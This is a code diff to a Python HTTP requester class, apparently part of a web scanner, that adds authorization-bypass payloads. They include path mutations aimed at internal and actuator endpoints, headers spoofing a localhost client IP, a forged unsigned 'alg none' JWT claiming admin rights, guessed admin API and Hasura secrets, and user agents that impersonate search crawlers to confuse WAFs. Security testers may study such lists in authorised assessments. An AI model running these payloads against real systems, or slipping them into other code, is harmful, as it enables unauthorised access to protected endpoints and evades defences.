@@ -15,6 +15,8 @@ from urllib.parse import urlparse, urlunparse
 
 import aiohttp
 
+
+from .stealth_headers import get_stealth_headers
 logger = logging.getLogger(__name__)
 
 
@@ -302,6 +304,32 @@ class SmartRequester:
             path + ';jsessionid=test',
             path + ';.css',
             path + ';.js',
+            
+            # 🔥 MODERN 2024/2025 PATH BYPASSES
+            # HTTP/2 specific
+            path + '?HTTP/2.0',
+            path + '%20HTTP/1.1',
+            
+            # GraphQL bypasses
+            path.replace('/graphql', '/graphiql'),
+            path.replace('/api/', '/api/v1/'),
+            path.replace('/api/', '/api/v2/'),
+            path.replace('/api/', '/internal/'),
+            
+            # Kubernetes/Docker specific
+            path + '/health',
+            path + '/metrics', 
+            path + '/debug',
+            path + '/actuator',
+            
+            # WebSocket upgrades
+            path + '?upgrade=websocket',
+            path + '?connection=upgrade',
+            
+            # Cache busting
+            path + '?t=' + str(int(__import__('time').time())),
+            path + '?v=1',
+            path + '?_=' + str(int(__import__('time').time() * 1000)),
 
             # Authorization bypass headers will be handled separately
             # These are path-only techniques
@@ -339,7 +367,7 @@ class SmartRequester:
                 'Accept-Language': 'en-US,en;q=0.9',
             },
 
-            # 🚀 MASSIVE ENTERPRISE HEADER BYPASS TECHNIQUES (100+ methods)
+            # 🚀 MASSIVE ENTERPRISE HEADER BYPASS TECHNIQUES (150+ methods)
             # IP Spoofing variants
             {
                 **h0,
@@ -348,6 +376,78 @@ class SmartRequester:
                 'X-Originating-IP': '127.0.0.1',
                 'X-Remote-IP': '127.0.0.1',
                 'X-Client-IP': '127.0.0.1',
+            },
+            
+            # 🔥 MODERN 2024/2025 BYPASS TECHNIQUES
+            # CloudFlare specific bypasses
+            {
+                **h0,
+                'CF-Connecting-IP': '127.0.0.1',
+                'CF-IPCountry': 'US',
+                'CF-Ray': 'test-bypass',
+                'CF-Visitor': '{"scheme":"https"}',
+            },
+            
+            # API Gateway bypasses
+            {
+                **h0,
+                'X-API-Key': 'admin',
+                'X-API-Version': 'v1',
+                'X-App-Version': '1.0.0',
+                'X-Client-Version': 'bypass-test',
+                'X-Platform': 'web',
+            },
+            
+            # Modern WAF bypasses
+            {
+                **h0,
+                'X-Requested-With': 'XMLHttpRequest',
+                'X-CSRF-Token': 'bypass',
+                'X-HTTP-Method-Override': 'GET',
+                'X-Method-Override': 'GET',
+            },
+            
+            # JWT/OAuth bypasses
+            {
+                **h0,
+                'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.',
+                'X-Authorization': 'Bearer admin',
+                'X-Auth-Token': 'admin',
+            },
+            
+            # GraphQL bypasses
+            {
+                **h0,
+                'X-GraphQL-Depth': '1',
+                'X-Apollo-Tracing': '1',
+                'X-Hasura-Admin-Secret': 'admin',
+            },
+            
+            # CDN/Load Balancer bypasses
+            {
+                **h0,
+                'X-Forwarded-Server': host,
+                'X-ProxyUser-Ip': '127.0.0.1',
+                'X-HTTP-DestinationURL': f'http://{host}',
+                'X-Forwarded-Proto': 'https',
+            },
+            
+            # Mobile/App specific
+            {
+                **h0,
+                'X-Device-Type': 'mobile',
+                'X-OS': 'iOS',
+                'X-App-Build': '1000',
+                'X-Channel': 'internal',
+            },
+            
+            # Cache poisoning headers
+            {
+                **h0,
+                'X-Cache': 'MISS',
+                'X-Cache-Status': 'MISS',
+                'X-Varnish': '123456',
+                'X-Served-By': 'cache-bypass',
                 'X-Remote-Addr': '127.0.0.1',
                 'X-Cluster-Client-IP': '127.0.0.1',
             },
@@ -633,11 +733,72 @@ class SmartRequester:
 
     def _ua_variants(self, base_headers: Dict[str, str]) -> List[Dict[str, str]]:
         h0 = {k: v for k, v in (base_headers or {}).items()}
+        
+        # 🔥 MASSIVE USER-AGENT ARSENAL (40+ browsers/tools)
         ua_list = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16 Safari/605.1.15',
-            'curl/8.1.2',
+            # Modern browsers 2024/2025
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            
+            # Mobile browsers
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
+            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            
+            # API clients and tools  
+            'curl/8.5.0',
+            'wget/1.21.4',
+            'HTTPie/3.2.2',
+            'PostmanRuntime/7.36.0',
+            'Insomnia/2023.8.6',
+            'axios/1.6.2',
+            'okhttp/4.12.0',
+            'Python-urllib/3.12',
+            'Go-http-client/1.1',
+            'Java/21.0.1',
+            
+            # Penetration testing tools
+            'sqlmap/1.7.11',
+            'Nuclei/v3.1.0',
+            'ffuf/v2.1.0',
+            'gobuster/v3.6.0',
+            'dirb/2.22',
+            'nikto/2.5.0',
+            'nmap/7.94',
+            'masscan/1.3.2',
+            'ZAP/2.14.0',
+            'Burp/2023.10.3.4',
+            
+            # Security scanners
+            'ModScan/3.0 (Professional Bug Bounty Scanner)',
+            'Nessus/10.6.4',
+            'OpenVAS/22.4',
+            'Qualys/4.0',
+            'Rapid7/InsightVM',
+            'Acunetix/24.1',
+            
+            # Deceptive/legitimate services
+            'facebookexternalhit/1.1',
+            'Twitterbot/1.0',
+            'Googlebot/2.1',
+            'LinkedInBot/1.0',
+            'Slackbot-LinkExpanding 1.0',
+            
+            # Empty/minimal UAs for WAF confusion
+            '',
+            ' ',
+            'a',
+            'Mozilla',
+            'Robot',
+            'Bot',
+            'Scanner',
+            'Test',
+            'Admin',
+            'Internal',
         ]
+        
         variants = []
         for ua in ua_list:
             h = {**h0, 'User-Agent': ua}
